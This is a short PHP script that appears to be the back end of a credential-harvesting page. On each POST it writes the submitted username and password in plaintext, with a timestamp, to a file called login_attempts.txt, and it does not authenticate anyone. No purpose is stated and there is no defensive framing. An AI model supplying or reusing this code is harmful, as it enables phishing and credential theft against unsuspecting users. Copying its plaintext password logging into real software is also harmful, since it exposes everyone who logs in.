<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"] ?? "unknown";
    $password = $_POST["password"] ?? "unknown";
    $log = "[" . date("Y-m-d H:i:s") . "] Username: $username | Password: $password\n";
    
    file_put_contents("login_attempts.txt", $log, FILE_APPEND);
}
?>
